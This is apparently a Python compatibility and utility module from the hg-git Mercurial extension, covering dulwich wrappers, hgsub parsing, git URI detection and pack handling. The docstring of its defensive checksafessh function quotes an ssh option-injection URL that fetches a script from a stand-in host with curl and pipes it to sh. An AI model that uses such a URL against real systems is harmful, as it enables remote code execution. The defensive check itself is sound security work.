"""Compatibility functions for old Mercurial versions and other utility
functions."""

import collections
import contextlib
import functools
import importlib.resources
import os
import re
import tempfile

from dulwich import __version__ as dulwich_version, pack
from dulwich import errors
from dulwich.object_store import PackBasedObjectStore
from mercurial.i18n import _
from mercurial import (
    error,
    extensions,
    phases,
    util as hgutil,
    pycompat,
    wireprotov1peer,
)

gitschemes = (b'git', b'git+ssh', b'git+http', b'git+https')


@contextlib.contextmanager
def abort_push_on_keyerror():
    """raise a rather verbose error on missing commits"""

    try:
        yield
    except KeyError as e:
        raise error.Abort(
            b'cannot push git commit %s as it is not present locally'
            % e.args[0][:12],
            hint=(
                b'please try pulling first, or as a fallback run git-cleanup '
                b'to re-export the missing commits'
            ),
        )


@contextlib.contextmanager
def forcedraftcommits():
    """Context manager that forces new commits to at least draft,
    regardless of configuration.

    """
    with extensions.wrappedfunction(
        phases,
        'newcommitphase',
        lambda orig, ui: phases.draft,
    ):
        yield


def parse_hgsub(lines):
    """Fills OrderedDict with hgsub file content passed as list of lines"""
    # TODO: get rid of this code and rely on mercurial infrastructure
    rv = collections.OrderedDict()
    for l in lines:
        ls = l.strip()
        if not ls or ls.startswith(b'#'):
            continue
        name, value = l.split(b'=', 1)
        rv[name.strip()] = value.strip()
    return rv


def serialize_hgsub(data):
    """Produces a string from OrderedDict hgsub content"""
    return b''.join(b'%s = %s\n' % (n, v) for n, v in data.items())


def parse_hgsubstate(lines):
    """Fills OrderedDict with hgsubtate file content passed as list of lines"""
    # TODO: get rid of this code and rely on mercurial infrastructure
    rv = collections.OrderedDict()
    for l in lines:
        ls = l.strip()
        if not ls or ls.startswith(b'#'):
            continue
        value, name = l.split(b' ', 1)
        rv[name.strip()] = value.strip()
    return rv


def serialize_hgsubstate(data):
    """Produces a string from OrderedDict hgsubstate content"""
    return b''.join(b'%s %s\n' % (data[n], n) for n in sorted(data))


def transform_notgit(f):
    '''use as a decorator around functions that call into dulwich'''

    def inner(*args, **kwargs):
        try:
            return f(*args, **kwargs)
        except errors.NotGitRepository:
            raise error.Abort(b'not a git repository')

    return inner


def isgitsshuri(uri):
    """Method that returns True if a uri looks like git-style uri

    Tests:

    >>> print(isgitsshuri(b'http://fqdn.com/hg'))
    False
    >>> print(isgitsshuri(b'http://fqdn.com/test.git'))
    False
    >>> print(isgitsshuri(b'git@github.com:user/repo.git'))
    True
    >>> print(isgitsshuri(b'github-123.com:user/repo.git'))
    True
    >>> print(isgitsshuri(b'git@127.0.0.1:repo.git'))
    True
    >>> print(isgitsshuri(b'git@[2001:db8::1]:repository.git'))
    True
    """
    for scheme in gitschemes:
        if uri.startswith(b'%s://' % scheme):
            return False

    if uri.startswith(b'http:') or uri.startswith(b'https:'):
        return False

    m = re.match(br'(?:.+@)*([\[]?[\w\d\.\:\-]+[\]]?):(.*)', uri)
    if m:
        # here we're being fairly conservative about what we consider to be git
        # urls
        giturl, repopath = m.groups()
        # definitely a git repo
        if len(giturl) > 1 and repopath.endswith(b'.git'):
            return True
        # use a simple regex to check if it is a fqdn regex
        fqdn_re = (
            br'(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{1,63}'
            br'(?<!-)\.)+[a-zA-Z]{2,63}$)'
        )
        if re.match(fqdn_re, giturl):
            return True
    return False


def checksafessh(host):
    """check if a hostname is a potentially unsafe ssh exploit (SEC)

    This is a sanity check for ssh urls. ssh will parse the first item as
    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
    Let's prevent these potentially exploited urls entirely and warn the
    user.

    Raises an error.Abort when the url is unsafe.
    """
    host = hgutil.urlreq.unquote(host)
    if host.startswith(b'-'):
        raise error.Abort(_(b"potentially unsafe hostname: '%s'") % (host,))


def decode_guess(string, encoding):
    # text is not valid utf-8, try to make sense of it
    if encoding:
        try:
            return string.decode(pycompat.sysstr(encoding)).encode('utf-8')
        except UnicodeDecodeError:
            pass

    try:
        return string.decode('latin-1').encode('utf-8')
    except UnicodeDecodeError:
        return string.decode('ascii', 'replace').encode('utf-8')


# Stolen from hgsubversion
def swap_out_encoding(new_encoding=b'UTF-8'):
    try:
        from mercurial import encoding

        old = encoding.encoding
        encoding.encoding = new_encoding
    except (AttributeError, ImportError):
        old = hgutil._encoding
        hgutil._encoding = new_encoding
    return old


def set_refs(ui, git, refs):
    for git_ref, git_sha in refs.items():
        try:
            # prior to 0.20.22, dulwich couldn't handle refs pointing
            # to missing objects, so don't add them
            #
            # moreover, don't set the ref if it already points to the
            # target object since setting the ref triggers a fsync,
            # which can be very slow in large repositories
            if (
                git_sha
                and git_sha in git
                and git.refs.follow(git_ref)[1] != git_sha
            ):
                git.refs[git_ref] = git_sha
        except OSError:
            # some refs may actually be unstorable, e.g. refs
            # containing a double quote on Windows or non-UTF-8 refs
            # on macOS, so handle that gracefully -- and older
            # versions of Dulwich don't even handle _checking_ for
            # those refs
            ui.traceback()
            ui.warn(b"warning: failed to save ref %s\n" % git_ref)


def ref_exists(ref: bytes, container):
    """Check whether the given ref is contained by the given container.

    Unlike Dulwich, this handles underlying OS errors for a disk refs container.
    """
    try:
        return ref in container
    except OSError:
        return False


def get_package_resource(path):
    """get the given hg-git resource as a binary string"""

    components = (__package__, *path.split('/'))

    package = '.'.join(components[:-1])
    name = components[-1]

    if hasattr(importlib.resources, 'files'):
        # added in 3.11; the old one now triggers a deprecation warning
        return importlib.resources.files(package).joinpath(name).read_bytes()
    else:
        return importlib.resources.read_binary(package, name)


if dulwich_version >= (0, 21, 0):

    @contextlib.contextmanager
    def add_pack(object_store: PackBasedObjectStore):
        """Wrapper for ``object_store.add_pack()`` that's a context manager"""
        f, commit, abort = object_store.add_pack()

        try:
            yield f
            commit()
        except Exception:
            abort()
            raise

else:
    # dulwich 0.20 or earlier, where add_pack() doesn't work with thin
    # packs...
    @contextlib.contextmanager
    def add_pack(object_store: PackBasedObjectStore):
        """Simple context manager for adding a file to a pack"""
        if hasattr(object_store, "find_missing_objects"):
            with tempfile.NamedTemporaryFile(
                prefix='hg-git-fetch-',
                suffix='.pack',
                dir=object_store.pack_dir,
                delete=False,
            ) as f:
                delete = True
                try:
                    yield f

                    f.flush()

                    if f.tell():
                        if not os.listdir(object_store.pack_dir):
                            # we're in an initial clone
                            object_store.move_in_pack(f.name)
                            delete = False
                        else:
                            f.seek(0)
                            object_store.add_thin_pack(f.read, None)
                finally:
                    if delete:
                        os.remove(f.name)


def makebatchable(fn):
    @functools.wraps(fn)
    @wireprotov1peer.batchable
    def wrapper(*args, **kwargs):
        return None, lambda v: fn(*args, **kwargs)

    return wrapper


def create_delta(base_buf, target_buf):
    delta = pack.create_delta(base_buf, target_buf)

    if not isinstance(delta, bytes):
        delta = b''.join(delta)

    return delta
